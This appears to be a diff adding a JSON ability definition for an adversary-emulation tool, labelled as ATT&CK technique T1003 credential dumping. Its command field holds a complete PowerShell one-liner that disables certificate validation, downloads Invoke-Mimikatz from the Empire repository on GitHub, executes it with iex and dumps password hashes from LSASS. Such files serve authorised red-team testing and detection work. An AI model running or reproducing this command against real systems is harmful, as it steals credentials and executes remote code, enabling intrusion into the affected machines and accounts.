@@ -1,0 +1,19 @@
+[
+  {
+    "id": "ca-003",
+    "name": "Credential Dumping (T1003) using Process Injection (T1055)",
+    "description": "Mimikatz lsadump::sam is executed via Invoke-Mimikatz to dump hashes via process injection into LSASS.",
+    "tactic": "credential-access",
+    "technique": {
+      "attack_id": "T1003",
+      "name": "Credential Dumping"
+    },
+    "type": "endpoint",
+    "platform": "windows",
+    "interface": "psh",
+    "input_argument": "",
+    "output_argument": "",
+    "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\r\n          $web = (New-Object System.Net.WebClient);\r\n          $result = $web.DownloadString(\"https:\/\/raw.githubusercontent.com\/EmpireProject\/Empire\/master\/data\/module_source\/credentials\/Invoke-Mimikatz.ps1\");\r\n          iex $result;\r\n Invoke-Mimikatz;",
+    "dependencies": ""
+  }
+]
